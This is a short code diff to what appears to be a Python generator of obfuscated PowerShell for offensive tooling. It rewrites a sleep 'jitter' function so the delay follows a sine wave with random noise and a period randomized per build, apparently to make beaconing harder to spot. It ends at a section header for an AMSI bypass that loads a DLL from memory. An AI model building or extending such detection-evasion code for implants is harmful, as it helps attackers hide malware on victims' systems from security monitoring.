@@ -106,7 +106,20 @@ def _xurl(url: str) -> tuple[str, str]:
 
 def _jitter(jmin: int, jmax: int) -> str:
     vms = _rv()
-    return f"{vms}=Get-Random -Minimum {jmin} -Maximum {jmax};Start-Sleep -Milliseconds {vms}"
+    vt  = _rv()
+    mid = (jmin + jmax) // 2
+    amp = max(1, (jmax - jmin) // 2)
+    noise = max(1, amp // 3)
+    # Period randomized per build: 45–120 s. Divisor = period / (2π).
+    period_ms = random.randint(45000, 120000)
+    divisor   = max(1, int(period_ms / 6.2832))
+    return (
+        f"{vt}=[Math]::Abs([Environment]::TickCount);"
+        f"{vms}=[Math]::Max({jmin},[Math]::Min({jmax},[int]("
+        f"{mid}+{amp}*[Math]::Sin({vt}/{divisor}.0)+"
+        f"(Get-Random -Minimum -{noise} -Maximum {noise}))));"
+        f"Start-Sleep -Milliseconds {vms}"
+    )
 
 
 # ── AMSI bypass — precompiled DLL loaded from memory ─────────────────────────
